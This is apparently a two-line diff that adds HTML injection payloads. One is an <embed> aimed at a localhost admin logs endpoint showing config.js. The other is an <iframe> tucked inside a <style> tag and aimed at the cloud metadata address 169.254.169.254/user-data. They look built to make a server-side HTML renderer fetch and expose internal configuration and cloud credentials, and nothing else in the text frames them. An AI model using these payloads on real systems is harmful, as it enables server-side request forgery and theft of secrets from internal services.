@@ -1,0 +1,2 @@
+<h1>Straight => <embed type="text/plain" src="http://127.0.0.1:8000/admin/logs?show=config.js"/> </h1>
+<style><iframe src="http://169.254.169.254/user-data"> 
